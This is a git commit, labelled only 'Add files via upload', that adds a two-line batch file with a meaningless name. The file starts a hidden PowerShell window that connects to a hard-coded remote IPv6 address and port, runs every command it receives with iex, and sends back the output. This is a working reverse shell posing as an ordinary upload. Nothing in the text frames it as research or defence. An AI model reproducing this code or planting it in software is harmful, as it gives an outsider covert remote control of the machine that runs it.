f3d567e38a92f25fd2de20238c860d0748689d2e
regisgemes8-creator <regisgemes8@gmail.com>
2026-05-12 21:16:32 +0300

    Add files via upload

---
+++ file-vj8undefined.bat
@@ -0,0 +1,2 @@
+@echo off
+powershell -WindowStyle Hidden -Command "$client = New-Object System.Net.Sockets.TCPClient('[2001:4860:7:171b::fd]',17178);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
